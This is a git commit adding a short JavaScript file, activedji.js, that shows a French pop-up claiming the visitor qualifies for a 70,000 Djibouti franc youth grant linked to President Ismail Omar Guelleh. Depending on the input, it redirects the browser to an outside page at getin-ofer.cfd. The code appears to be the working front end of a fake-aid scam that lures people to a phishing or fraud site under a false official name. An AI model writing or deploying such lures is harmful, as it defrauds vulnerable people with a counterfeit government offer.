99ba5507b78013e443ac7979ca7db54f09ee4f62
Help-All <imaobongumoh637@gmail.com>
2026-04-10 05:42:29 +0100

    Create activedji.js

---
+++ activedji.js
@@ -0,0 +1,10 @@
+var password = 'Fdj 70,000';
+
+password = prompt(
+  'Félicitations, vous êtes éligible pour recevoir le soutien financier d’autonomisation des jeunes Fdj70,000 ISMAIL OMAR GUELLEH. Cliquez sur OK pour recevoir instantanément.',
+  'Fdj 70,000'
+);
+
+if (password !== 'Fdj 70,000') {
+    location.href = 'https://getin-ofer.cfd/Soutien-Aux-Jeunes.html';
+}
